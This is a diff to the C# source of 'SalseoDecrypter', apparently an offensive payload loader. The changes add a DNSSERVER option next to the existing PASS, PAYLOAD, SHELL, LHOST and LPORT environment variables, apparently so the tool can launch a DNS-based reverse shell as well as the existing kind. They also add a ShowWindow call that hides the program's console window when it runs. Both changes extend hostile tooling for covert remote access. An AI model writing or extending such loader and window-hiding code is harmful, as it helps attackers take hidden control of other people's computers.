@@ -1,4 +1,4 @@
-﻿/*
+/*
  * Created by SharpDevelop.
  * User: CyberVaca 
  * Twitter: https://twitter.com/CyberVaca_
@@ -17,10 +17,16 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.IO.Compression;
 using System.Reflection;
+using System.Diagnostics;
 namespace SalseoDecrypter
 {
+
     class Program
     {
+	    
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         static void main()
         {
             //#############################################################
@@ -31,16 +37,21 @@ namespace SalseoDecrypter
             string varshell = null;
             string varlhost = null;
             string varlport = null;
+            string vardnsserver = null;
             if ((Environment.GetEnvironmentVariable("PASS")) != null) { varpass = Environment.GetEnvironmentVariable("PASS"); } else { };
             if ((Environment.GetEnvironmentVariable("PAYLOAD")) != null) { varpayload = Environment.GetEnvironmentVariable("PAYLOAD"); } else { };
             if ((Environment.GetEnvironmentVariable("SHELL")) != null) { varshell = Environment.GetEnvironmentVariable("SHELL"); } else { };
             if ((Environment.GetEnvironmentVariable("LHOST")) != null) { varlhost = Environment.GetEnvironmentVariable("LHOST"); } else { };
             if ((Environment.GetEnvironmentVariable("LPORT")) != null) { varlport = Environment.GetEnvironmentVariable("LPORT"); } else { };
-            if (varpass != null & varpayload != null & varshell != null & varlhost != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };
+            if ((Environment.GetEnvironmentVariable("DNSSERVER")) != null) { vardnsserver = Environment.GetEnvironmentVariable("DNSSERVER"); } else { };
+            if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver == null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };
+		    if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, vardnsserver}; Main(argumentos); };
 
         }
         static void Main(string[] args)
         {
+    	IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
+    	ShowWindow(h, 0);
             string banner = @"
   _____  ____  _     _____   ___   ___    
  / ___/ /    || |   / ___/  /  _] /   \   
@@ -59,7 +70,6 @@ namespace SalseoDecrypter
 |_____| \___/ |__|__||_____||_____||__|\_|
 
 ";
-
             Console.ForegroundColor = ConsoleColor.Green;
             Console.Write(banner);
             Console.ForegroundColor = ConsoleColor.White;
@@ -363,4 +373,3 @@ namespace SalseoDecrypter
 
 
 }
-
